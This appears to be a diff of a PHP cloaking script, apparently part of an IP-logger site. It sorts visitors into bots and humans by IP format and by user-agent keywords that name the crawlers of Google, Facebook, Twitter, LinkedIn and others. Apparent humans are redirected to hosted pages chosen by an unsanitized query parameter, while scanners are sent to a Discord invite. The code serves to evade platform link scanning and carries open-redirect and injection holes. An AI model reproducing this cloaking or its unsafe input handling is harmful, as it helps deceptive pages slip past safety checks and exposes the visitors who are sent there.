@@ -1,54 +1,34 @@
 <?php 
+function IsValidIP() 
+{ 
+    //https://github.com/CybrDev/IP-Logger Get_IP
+	$ip = "unknown";
+    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
+	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
+	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
+	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
+	if($ip == "::1") return true; //localhost
+	return preg_match('/^(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)(?:[.](?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)){3}$/', $ip); //Is IP like num.num.num.num  NUM is number b/w 0-999 //https://stackoverflow.com/a/31784191/14919621
+} 
 
-function detect() 
+function IsValidUserAgent() 
 {
+    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
+    $User_Agent = strtolower($_SERVER['HTTP_USER_AGENT']);
     //$b means list of bots user agents, Mostly these words came in bots user agent, So we don't allow them.
-    $b = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
-
+    $Bots = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
     //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
-    $h =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
+    $Humans =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
+    foreach ($Bots as $Bot) if (substr_count($User_Agent , $Bot) > 0) return false;
+    foreach ($Humans as $Human) if (substr_count($User_Agent,$Human) > 0) return true;
+    	 
+}
 
-    if (!empty($_SERVER['HTTP_USER_AGENT']))
-    {
-	//$u will get user agent
-        $u = strtolower($_SERVER['HTTP_USER_AGENT']);
-        
-        foreach ($b as $bv)
-        {
-            if (substr_count($u , $bv) > 0) 
-            {
-                echo "<script>console.log('You are detected as bot at=".$bv."');</script>";
-                return false;
-            }
-        }
+if((IsValidIP() and IsValidUserAgent()) == true) 
+{	//echo "NOT BOT";
+	if(isset($_GET['redirect'])) header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));die();
+}
+header( "Location: https://discord.com/invite/Hu5XPGMTuk");
+die();
 
-        foreach ($h as $hv)
-        {
-             if (substr_count($u,$hv) > 0) 
-            {
-                echo "<script>console.log('You are detected as human at=".$hv."');</script>";
-                return True;
-            }
-        }
-	    
-    } 
-    else 
-    { 
-	    return False; 
-    }
-	
-}
-if(detect() == true)
-{
-	if(isset($_GET['redirect']))
-	{
-		echo "<script>window.location.replace('.././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : "") ."');</script>";
-	}
-}
-else
-{
-	//Let's teach bot a lesson
-    include("tease.php"); 
-    tease();
-}
 ?>
